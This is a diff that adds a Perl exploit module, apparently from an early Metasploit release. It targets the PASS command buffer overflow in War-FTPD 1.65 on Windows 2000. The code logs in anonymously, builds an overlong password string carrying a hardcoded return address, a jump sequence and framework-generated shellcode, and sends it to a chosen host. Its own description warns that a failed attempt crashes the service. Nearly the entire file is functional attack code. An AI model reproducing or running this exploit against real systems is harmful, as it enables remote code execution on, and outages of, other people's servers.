@@ -1,0 +1,174 @@
+use IO::Socket;
+use Pex;
+
+##
+#
+$Name = "War-FTPD 1.65 PASS (Win2k)";
+$Version = "1.0";
+$Author = "H D Moore";
+$URL = "http://www.metasploit.com";
+$Group = "FTP";
+$Description = "This exploits the buffer overflow found in the PASS command in ".
+               "War-FTPD 1.65. This particular module will only work reliably ".
+               "against Windows 2000 targets. The server must be configured to ".
+               "allow anonymous logins for this exploit to succeed. A failed ".
+               "attempt will bring down the service completely.".
+               "Please see the following URL for more information on this vulnerability.\n\n".
+               "http://lists.insecure.org/lists/bugtraq/1998/Feb/0014.html";    
+#
+##
+
+my $pex = Pex->new();
+my $pay = {};
+
+sub Init {
+    my ($obj) = @_;
+    $obj->NeedPayload(1);
+    $obj->Payloads();
+}
+
+sub Payloads {
+    my ($obj, $opt) = @_;
+    my $x = $pex->Payloads();
+    
+    # win32 exploit, load the payloads
+    my $wincode = $x->{"x86"}->{"win32"};
+    foreach my $s (keys(%{ $wincode }))
+    {
+        my $name = $wincode->{$s}->{"NAME"};
+        $pay->{$name} = $wincode->{$s};
+    }
+     
+    return $pay;
+}
+
+sub Check {
+    my ($obj, $opt) = @_;
+   
+    my $s = IO::Socket::INET->new (
+                Proto => "tcp",
+                PeerAddr => $opt->{"RHOST"},
+                PeerPort => $opt->{"RPORT"},
+                Type => SOCK_STREAM
+    );
+
+    if (! $s)
+    {
+        return "Could not conect to " . $opt->{"RHOST"} . ":" . $opt->{"RPORT"} . " -> $!";
+    }
+ 
+    my $banner = <$s>;
+    chomp($banner);
+    close($s);
+    
+    return $banner;
+}
+
+sub Options {
+    my ($obj, $payload) = @_;
+    my $res = {};
+      
+    $res->{"RHOST"} = [1, "The target system's ip address."];
+    $res->{"RPORT"} = [1, "The port that War-FTPD is running on."];    
+    
+    foreach my $popt (keys (%{ $pay->{$payload}->{"ARGS"} }))
+    {
+        $res->{$popt} = $pay->{$payload}->{"ARGS"}->{$popt};
+    }
+    return $res;
+}
+
+sub SetupPayload {
+    my ($opt) = @_;
+
+    my $payload = $pay->{$opt->{"PAYLOAD"}};
+    my (undef, $parch, $pos, $pname) = split(/\_/, $payload->{"METH"});
+    if (! $pname)
+    {
+        print "[*] No such payload exists.\n";
+        return(undef);
+    }
+    
+    print "[*] Generating payload " . $opt->{"PAYLOAD"} . " ($parch, $pos, $pname)...\n";
+    
+    my $shellcode = $pex->EasySC("\x00+&=%\x0a\x0d\x20", 512, $parch, $pos, $pname, $opt);
+
+    if ($shellcode)
+    {
+        print "[*] Payload generation complete (" . length($shellcode) . " bytes)\n";
+    } else {
+        print "[*] Error generating payload: " . $pex->Error() . "\n";
+        return(undef);
+    }
+
+    my $listener;
+    my $handler = $payload->{"SHELL"};
+      
+    if ($handler)
+    { 
+        $listener = $pex->$handler($opt);
+        if ($listener == 0) { return undef }
+        return ($shellcode, $listener);
+    }
+    
+    # other payloads fork to maintain compatibility
+    $listener = $$;
+    my $exploit = fork();
+    if (! $exploit) { return ($shellcode, $listener) }
+    while (waitpid($exploit, WNOHANG) == 0) { sleep(1) }
+    return(undef);
+}
+
+sub Exploit {
+    my ($obj, $opt) = @_;
+
+    select(STDOUT);$|++;
+
+    my $target_host = $opt->{"RHOST"};
+    my $target_port = $opt->{"RPORT"};
+ 
+    my ($shellcode, $listener) = SetupPayload($opt);
+    if (! defined($shellcode)) { return }
+
+    my $request = ("META" x 1024);
+
+    # this return address is a jmp ebx in the included MFC42.DLL
+    substr($request, 562, 4, pack("l", 0x5f4e772b));
+    
+    substr($request, 558, 4, "\xeb\x08\xeb\x08");
+    substr($request, 566, length($shellcode), $shellcode);
+
+
+    my $s = IO::Socket::INET->new (
+                Proto => "tcp",
+                PeerAddr => $target_host,
+                PeerPort => $target_port,
+                Type => SOCK_STREAM
+    );
+
+    if (! $s)
+    {
+        print "[*] Error, could not connect to $target_host:$target_port.\n";
+        exit(0);
+    }
+
+    my $r = <$s>;
+    if (! $r) { print "[*] No FTP response\n"; kill("TERM", $listen_pid); return; }
+    print "[*] REMOTE> $r";
+    $r = <$s>;
+    print "[*] REMOTE> $r";
+
+    
+    print $s "USER ANONYMOUS\n";
+    $r = <$s>;    
+    if (! $r) { print "[*] No FTP response\n"; kill("TERM", $listen_pid); return; }
+    print "[*] REMOTE> $r";
+    
+    print $s "PASS $request\n";
+    $r = <$s>;    
+    if (! $r) { print "[*] No FTP response\n"; kill("TERM", $listen_pid); return; }
+    print "[*] REMOTE> $r";
+
+    sleep(2);
+    exit(0);
+}
